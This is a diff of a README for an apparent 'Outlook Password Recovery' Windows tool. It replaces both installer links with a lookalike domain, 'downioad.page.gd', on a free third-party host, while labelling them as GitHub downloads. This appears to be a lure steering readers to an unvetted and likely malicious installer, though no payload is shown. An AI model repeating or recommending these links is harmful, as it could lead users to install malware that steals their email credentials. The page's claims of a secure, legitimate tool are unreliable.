@@ -2,7 +2,7 @@
 
 Outlook Password Recovery is a specialized Windows desktop application designed to help users regain access to their Outlook email accounts by recovering lost or forgotten passwords. This tool supports multiple versions of Microsoft Outlook and provides a straightforward, secure process for password retrieval on Windows 10 and Windows 11 systems. Updated for 2026, it includes the latest compatibility patches and performance improvements.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -61,6 +61,6 @@ A5: The tool is designed for legitimate password recovery scenarios, such as rec
 
 ## Get the Latest Version
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: November 2026*
